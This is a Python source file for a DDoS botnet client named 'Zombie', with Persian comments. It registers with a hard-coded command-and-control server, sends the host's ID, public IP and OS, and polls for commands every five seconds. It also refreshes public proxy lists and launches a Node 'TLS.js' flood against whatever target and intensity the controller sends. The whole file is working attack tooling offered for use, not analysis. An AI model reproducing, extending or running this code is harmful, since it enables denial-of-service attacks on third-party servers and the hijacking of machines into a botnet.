import requests
import time
import platform
import uuid
import subprocess
import os
import threading
import logging

# ========== LOGGING ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)-8s | %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("ZOMBIE")

# ========== CONFIG ==========
C2_URL = "http://160.236.239.137:8083"  # آدرس C2
PROXY_URL = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/refs/heads/master/http.txt" # لینک پروکسی
ZOMBIE_ID = str(uuid.uuid4())[:8]
CHECK_INTERVAL = 5 # هر ۵ ثانیه به C2 سر میزنه
PROXY_UPDATE_INTERVAL = 3 * 60 * 60 # هر ۳ ساعت (به ثانیه)

running_attacks = {} 

# ========== PROXY AUTO-UPDATER ==========
def update_proxies():
    logger.info("🔄 [PROXY] در حال آپدیت لیست پروکسی‌ها...")
    try:
        r = requests.get(PROXY_URL, timeout=15)
        if r.status_code == 200:
            # ذخیره در فایل proxy.txt
            with open("proxy.txt", "w", encoding="utf-8") as f:
                f.write(r.text)
            logger.info(f"✅ [PROXY] {len(r.text.splitlines())} پروکسی جدید دانلود شد.")
        else:
            logger.warning(f"⚠️ [PROXY] خطا در دانلود (کد {r.status_code})")
    except Exception as e:
        logger.error(f"❌ [PROXY] خطا در ارتباط: {e}")

def proxy_updater_loop():
    while True:
        update_proxies()
        time.sleep(PROXY_UPDATE_INTERVAL)

# ========== C2 COMMUNICATION ==========
def get_public_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text
    except:
        return "unknown"

def register():
    data = {
        "id": ZOMBIE_ID,
        "ip": get_public_ip(),
        "os": f"{platform.system()} {platform.release()}",
        "version": "1.0"
    }
    try:
        r = requests.post(f"{C2_URL}/api/register", json=data, timeout=10)
        return r.status_code == 200
    except:
        return False

def heartbeat():
    data = {"id": ZOMBIE_ID}
    try:
        r = requests.post(f"{C2_URL}/api/heartbeat", json=data, timeout=10)
        if r.status_code == 200:
            return r.json().get('commands', [])
    except:
        pass
    return []

# ========== ATTACK EXECUTION ==========
def run_attack(cmd):
    target = cmd.get('target')
    t = cmd.get('time')
    power = cmd.get('power')
    
    # تنظیمات بر اساس قدرت (1 تا 100)
    threads = max(1, int(power / 10))
    rate = max(1, int(power))
    
    # ⚠️ همیشه از TLS.js استفاده میکنیم
    script = "TLS.js"
    cmd_line = ["node", script, target, str(t), str(rate), str(threads)]
    
    logger.info(f"🚀 [ATTACK] Starting: {' '.join(cmd_line)}")
    
    try:
        proc = subprocess.Popen(cmd_line, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        key = f"{target}_{int(time.time())}"
        running_attacks[key] = proc
        return key
    except Exception as e:
        logger.error(f"❌ [ATTACK] Failed: {e}")
        return None

def stop_all_attacks():
    logger.info("🛑 [ATTACK] Stopping all attacks...")
    for key, proc in list(running_attacks.items()):
        try:
            proc.terminate()
            logger.info(f"[-] Stopped: {key}")
        except:
            pass
        del running_attacks[key]

# ========== MAIN LOOP ==========
if __name__ == "__main__":
    logger.info(f"💀 Zombie {ZOMBIE_ID} starting...")
    
    # آپدیت اولیه پروکسی
    update_proxies()
    
    # اجرای آپدیت پروکسی در پس‌زمینه (هر ۳ ساعت)
    threading.Thread(target=proxy_updater_loop, daemon=True).start()
    
    # ثبت‌نام در C2
    while not register():
        logger.warning("[-] Failed to register, retrying in 10s...")
        time.sleep(10)
    
    logger.info("[+] Registered to C2.")
    
    # حلقه اصلی دریافت دستور
    while True:
        cmds = heartbeat()
        for cmd in cmds:
            if cmd.get('cmd') == 'attack':
                run_attack(cmd)
            elif cmd.get('cmd') == 'stop':
                stop_all_attacks()
        time.sleep(CHECK_INTERVAL)
